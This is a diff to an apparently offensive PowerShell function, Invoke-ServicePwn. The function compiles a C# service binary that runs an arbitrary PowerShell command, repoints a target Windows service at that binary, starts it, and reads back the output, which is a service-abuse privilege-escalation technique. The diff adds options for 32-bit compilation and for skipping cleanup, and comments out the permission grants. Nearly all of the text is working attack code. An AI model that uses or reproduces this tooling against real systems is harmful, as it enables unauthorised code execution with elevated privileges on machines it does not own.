@@ -10,7 +10,15 @@ function Invoke-ServicePwn {
         [Parameter(Position = 1)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $Command
+        $Command,
+
+        [Parameter(Position = 2)]
+	[switch]
+        $noClean,
+
+        [Parameter(Position = 3)]
+	[switch]
+        $use32
     )
 
     $csf = New-TemporaryFile;
@@ -18,15 +26,12 @@ function Invoke-ServicePwn {
     $coutf = New-TemporaryFile;
     Set-Content -Path $csf -Value @"
 using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
+using System.IO;
 using System.Diagnostics;
-using System.Linq;
 using System.ServiceProcess;
+using System.Collections.Generic;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
-using System.IO;
 
 namespace WindowsService1
 {
@@ -68,8 +73,15 @@ namespace WindowsService1
 }
 "@
     $liba = (Get-ChildItem -Filter System.Management.Automation.dll -Path c:\Windows\assembly\GAC_MSIL\System.Management.Automation\ -Recurse -ErrorAction SilentlyContinue).fullname;
-    c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /r:$liba /out:$outf $csf | Out-Null;
-    cmd /c icacls $outf /grant everyone:F | Out-Null;
+    if ($use32) {
+        c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /r:$liba /out:$outf $csf | Out-Null;
+    } else {
+        c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /r:$liba /out:$outf $csf | Out-Null;
+    }
+
+    #cmd /c icacls $csf /grant everyone:F | Out-Null;
+    #cmd /c icacls $outf /grant everyone:F | Out-Null;
+    #cmd /c icacls $coutf /grant everyone:F | Out-Null;
     Write-Host "service binary path: $outf";
     
     Set-Service -Name $Name -StartupType Manual;
@@ -84,8 +96,14 @@ namespace WindowsService1
     Write-Host "==============";
 
     Stop-Service -Name $Name;
-    rm "$csf";
-    rm "$outf";
-    rm "$coutf";
-    
+    Start-Sleep -s 1;
+    if ($noClean) {
+	Write-Host "$csf";
+	Write-Host "$outf";
+	Write-Host "$coutf";
+    } else {
+        Remove-Item -Path "$csf" -Force -ErrorAction Ignore;
+        Remove-Item -Path "$outf" -Force -ErrorAction Ignore;
+        Remove-Item -Path "$coutf" -Force -ErrorAction Ignore;
+    }
 }
